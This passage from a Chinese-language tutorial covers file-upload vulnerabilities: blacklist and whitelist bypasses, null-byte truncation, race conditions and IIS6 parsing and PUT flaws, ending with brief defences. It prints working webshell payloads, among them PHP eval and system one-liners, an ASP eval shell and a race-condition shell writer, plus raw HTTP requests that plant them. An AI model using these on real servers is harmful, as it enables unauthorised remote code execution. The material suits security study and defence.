## 3 绕过黑名单验证

### 3.1 BP枚举可解析后缀

利用burpsuite工具截断HTTP请求，利用intruder模块进行枚举后缀名，寻找黑名单中没有过滤的后缀名。

后缀名如php3、phtml、php4

### 3.2 .htaccess

#### 3.2.1 .htaccess文件介绍

htaccess文件是apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能

其中.htaccess文件内容：

SetHandler application/x-httpd-php

设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合php语言代码规范，就会被当作PHP执行。不符合则报错。

#### 3.2.2 配置http.conf

在apache中，如果需要启动.htaccess，必须在http.conf中设置AllowOverride为All

#### 3.2.3 审计黑名单过滤代码

在黑名单中，如果没有队.htaccess进行过滤，可以直接上传.htaccess来设置使php解析任意文件。

文件内容：SetHandler application/x-httpd-php

### 3.3 大小写绕过

在windows系统下，对于文件名中的大小写不敏感

在Linux系统下，大小写敏感

因此该绕过方法只适用于Windows系统。

### 3.4 .号绕过

Windows系统下，文件后缀名最后一个点会被自动去除

只适用于Windows系统。

使用BP在上传的文件名后加入.号

### 3.5 特殊符号绕过

Windows系统下，如果上传的文件名中test::$DATA会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。

::$DATA是ADS和NTFS文件系统所具有的格式

在Linux下修改文件名，因为在Windows下创建不了。

### 3.6 路径拼接绕过

在没有对上传的文件进行重命名的情况下，用户可以自定义文件名并在服务器中上传，就会造成对应的绕过黑名单。

例如，

用户新建 1.php.+空格+.

deldot删除最后一个点之后，不再进行删除，trim删除空格，那么最终上传的文件名为1.php.

利用Windows自动去除最后一个点，导致成功上传1.php。

在linux下修改文件名为`1.php. .`文件。

### 3.7 双写绕过

str\_ireplace()函数替换字符串中的字符，不区分大小写

str\_replace()函数区分大小写。

因此，可以双写后缀名来绕过

## 4 绕过白名单验证

### 4.1 绕过MIME-Type验证

#### 4.1.1 MiME-Type介绍

MIME（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当改扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开，多用于指定一些客户端自定义的文件夹，以及一些媒体文件打开方式。

#### 4.1.2 验证MIME-Type代码分析

使用`$_FILE['upload_file']['type']`获取上传文件的MIME-Type类型，其中upload\_file是在表单中定义的.

主要是白名单机制

#### 4.1.3 BP绕过验证

修改HTTP请求报文

抓包，修改第二个（头尾之间）Content-Type为image/jpeg

### 4.2 00截断绕过

0x00是十六进制表示方法，是ascii码为的字符，在有些函数处理时，会把这个字符当作结束符。

系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束

在PHP5.3之后的版本中完全修复了00截断。并且00截断受限于GPC，addslashes函数。

如1.php0x00.jpg

#### 4.2.1 GET型00截断

使用BP抓包，在截取的目录下修改

GET型提交的内容会被自动进行URL解码，注意：一定要关闭GPC，否则无法成功

#### 4.2.2 POST型00截断

在POST请求中，%00不会被自动解码，需要在16进制中进行修改。

在抓包处的hex中修改

### 5.2 文件包含漏洞代码分析

在PHP中，使用include、require、include\_once、require\_once函数包含的文件都会被当作PHP代码执行，无论文件的名称是什么，只要文件内容符合PHP代码规范，都会被当作PHP代码执行。

文件包含漏洞代码：

```
 <?php
    if($\_GET){
        include($\_GET\["file"\])
    }else{
        echo "not get args file";
    }
?>
```

## 6 竞争条件

### 6.1 文件上传过程介绍

服务器获取文件-->保存上传临时文件-->重命名移动临时文件

### 6.2 竞争条件原理介绍

网站逻辑：

1.  网站允许上传任意文件，然后检查上传文件是否包含webshell，如果包含删除该文件。
    
2.  网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件
    

在删除之前访问上传的php文件，从而执行上传文件中的php代码。

例如，webshell上传文件代码如下

```
 <?php 
    fputs(fopen('shell.php','w'),'<?php @eval($\_POST\["cmd"\])?>');
?>
```

在删除webshell之前，访问其中的内容，从而生成了shell.php

### 6.3 竞争条件代码分析

先进行上传，后进行判断与删除。

利用时间差进行webshell上传

### 6.4 竞争条件文件上传利用

## 7 中间件IIS6.0解析漏洞

### 7.1 IIS6.0解析漏洞介绍

1.  当建立\*.asa、\*.asp格式的文件夹时，其目录下的任意文件都将被IIS当作asp文件解析。<%=NOW()%>
    
2.  当文件名为\*.asp;1.jpg，IIS6.0同样会将文件作为asp文件解析。
    

目前，微软也没有推出补丁，不认为这是一个漏洞。

### 7.2 IIS6.0 PUT上传原理

WebDAV模块基于HTTP1.1协议的通信协议，使得HTTP支持PUT，MOVE，COPY，DELETE方法。

1.  探测是否存在IIS PUT漏洞：
    
    OPTIONS/HTTP1.1
    
    Host:www.xxx.com
    
2.  上传txt文本文件
    
    PUT /a.txt HTTP1.1
    
    Host:www.xxx.com
    
    Content-Length:30
    
    <%eval request("chopper")%>
    
3.  通过MOVE或COPY重命名
    
    COPY /a.txt HTTP1.1
    
    Host:www.xxx.com
    
    Destination:
    
    http://www.xxx.com/cmd.asp
    
4.  删除
    
    DELETE /a.txt HTTP1.1
    
    Host:www.xxx.com

## 8 常用的一句话webshell

使用PHP中的函数system执行GET提交的参数：

```
 <?php
    if($\_GET)
    {
        $cmd\=$\_GET\["cmd"\];
        system($cmd);
    }
    else
        echo "no cmd";
?>
```

经典一句话木马：

```
 <?php @eval($\_POST\["cmd"\])?>
```

## 9 防范措施

不要在前端使用JS实施上传限制策略

通过服务器对上传文件进行限制：

1.  进行多条件组合检查：比如文件的大小，路径，扩展名，文件类型，文件完整性
    
2.  对上传文件在服务器上存储时进行重命名（制定合理的命名规则）
    
3.  对服务端上传文件的目录进行权限控制，比如只读，限制执行权限带来的危害
